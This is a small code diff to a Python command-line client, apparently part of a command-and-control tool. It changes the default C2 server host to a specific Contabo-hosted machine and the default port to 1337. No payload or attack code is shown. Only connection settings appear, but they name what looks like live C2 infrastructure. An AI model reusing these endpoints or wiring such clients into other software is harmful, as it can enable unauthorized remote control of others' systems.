@@ -50,14 +50,14 @@ class Client:
 @click.option(
     "--server_address",
     "-s",
-    default="balgogan-kerago.eu",
+    default="vmi850151.contaboserver.net",
     type=click.STRING,
     help="Ip address or host of a running c&c",
 )
 @click.option(
     "--port",
     "-p",
-    default="9000",
+    default="1337",
     type=click.INT,
     help="Port where the running c&c listens",
 )
